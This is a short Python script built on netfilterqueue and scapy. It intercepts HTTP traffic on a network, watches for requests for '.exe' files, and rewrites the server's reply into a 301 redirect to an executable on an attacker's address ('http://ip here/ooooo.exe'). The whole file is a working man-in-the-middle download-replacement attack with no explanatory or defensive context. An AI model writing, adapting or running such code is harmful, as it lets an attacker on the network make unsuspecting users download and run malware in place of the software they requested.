#!/usr/bin/python
# 2 #
import netfilterqueue
import scapy.all as scapy

ackls = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    scp = scapy_packet
    if scp.haslayer(scapy.Raw):
        if scp[scapy.TCP].dport == 80:
            if '.exe' in scp[scapy.Raw].load:
                print('Request > exe')
                ackls.append(scp[scapy.TCP].ack)
        
        elif scp[scapy.TCP].sport == 80:
            if scp[scapy.TCP].seq in ackls:
                ackls.remove(scp[scapy.TCP].seq)
                print('rif > active')
                scp[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: http://ip here/ooooo.exe\n\n'
                del scp[scapy.IP].len
                del scp[scapy.IP].chksum
                del scp[scapy.TCP].chksum
                packet.set_payload(str(scp))
    
    packet.accept()
                
                
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
